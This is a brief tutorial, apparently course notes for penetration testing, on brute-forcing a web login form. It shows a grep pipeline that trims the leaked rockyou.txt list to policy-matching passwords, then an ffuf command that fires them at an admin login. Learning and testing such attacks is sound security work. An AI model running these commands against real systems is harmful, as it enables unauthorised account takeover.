# Brute-Forcing Passwords
***
#### To execute a successful brute-force attack we need to use a good wordlist , ensuring that it only contains passwords that match the implemented password policy.
#### For example, the famous wordlist `rockyou.txt` has more than 14 million passwords, Whe can use `grep` to match only those passwords that match the password policy implemented by the target .
```bash
$ grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

#### Finally, we can use **ffuf** to perform the brute-force attack on the password field.
```bash
$ ffuf -w ./custom_wordlist.txt -u http://172.123.123.123/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```